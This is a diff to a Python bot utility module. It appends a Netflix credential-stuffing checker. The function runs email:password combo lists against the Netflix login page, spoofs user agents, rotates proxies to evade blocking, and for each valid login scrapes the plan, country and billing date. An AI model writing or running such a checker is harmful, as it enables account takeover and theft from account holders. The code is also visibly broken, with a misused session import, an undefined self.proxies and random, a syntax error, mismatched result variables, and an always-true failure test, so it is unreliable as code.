@@ -1,7 +1,7 @@
 from urllib.parse import quote
 
 from bs4 import BeautifulSoup
-from requests import get, post
+from requests import get, post, session
 from telethon import Button
 
 from ._config import TMDB_KEY as tapiKey
@@ -286,3 +286,33 @@ def translate(text, to_lang="en"):
     soup = BeautifulSoup(request.text, "html.parser")
     result = soup.find("span", {"id": "tw-answ-target-text"})
     return result.text if result else "vision.google.api returned err."
+from fake_useragent import UserAgent as ua
+def netflix_login(combos):
+ hits = 0
+ bad = 0
+ result = []
+ for combo in combos:
+    client = session.Session()
+    login = client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random})
+    soup = BeautifulSoup(login.text,'html.parser')
+    loginForm = soup.find('form')
+    authURL = loginForm.find('input', {'name': 'authURL'}).get('value')   
+    headers = {"user-agent": ua().random,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "accept-language": "en-US,en;q=0.9", "accept-encoding": "gzip, deflate, br", "referer": "https://www.netflix.com/login", "content-type": "application/x-www-form-urlencoded","cookie":""}
+    data = {"userLoginId:": combo.split(":")[0], "password": combo.split(":")[1], "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", "authURL": authURL, "nextPage": "https://www.netflix.com/browse","countryCode": "+1","countryIsoCode": "US"}  
+            
+    request = client.post("https://www.netflix.com/login",headers =headers, data =data ,proxies =random.choice(self.proxies))
+            cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers ={"User-Agent": ua().random}, proxies =random.choice(self.proxies)).cookies.get("flwssn"))
+            
+    if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
+                bad += 1
+    else:     
+                info = client.get("https://www.netflix.com/YourAccount", headers ={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,"Accept-Encoding": "gzip, deflate, br" ,"Accept-Language": "en-US,en;q=0.9" ,"Connection": "keep-alive" ,"Host": "www.netflix.com" ,"Referer": "https://www.netflix.com/browse" ,"Sec-Fetch-Dest": "document" ,"Sec-Fetch-Mode": "navigate" ,"Sec-Fetch-Site": "same-origin" ,"Sec-Fetch-User": "?1" ,"Upgrade-Insecure-Requests": "1" ,"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"}, cookies =cookie, proxies =random.choice(self.proxies), timeout =10).text
+                plan = info.split('data-uia="plan-label"><b>')[1].split('</b>')[0]
+                country = info.split('","currentCountry":"')[1].split('"')[0]
+                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
+                hits += 1
+                results.append({"email": combo.split(":")[0], "password": combo.split(":")[1], "plan": plan, "country"; country, "expiry": expiry})
+ return result, hits, bad
+                
+   
+            
